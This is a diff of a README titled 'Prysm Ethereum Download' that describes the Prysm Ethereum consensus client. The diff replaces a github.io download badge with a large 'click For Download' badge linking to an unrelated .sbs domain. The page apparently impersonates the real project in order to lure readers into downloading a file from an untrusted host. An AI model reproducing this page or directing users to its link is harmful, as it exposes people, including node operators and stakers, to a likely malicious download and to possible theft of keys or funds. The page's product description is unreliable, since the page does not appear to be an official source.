@@ -2,11 +2,15 @@
 
 Prysm Ethereum Download provides fast and reliable access to Prysm — a Go-based Ethereum consensus client. Install easily using the official installer script, Docker container, or build from source. Get your beacon node and validator up quickly with secure JWT authentication and checkpoint syncing. Ideal for beginners and advanced users alike, this tool supports efficient staking and robust node operation with simplified setup and full version management.
 
-<div style="text-align: center">
-  <a href="https://prysm-ethereum-download.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Prysm_Ethereum_Download-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
 
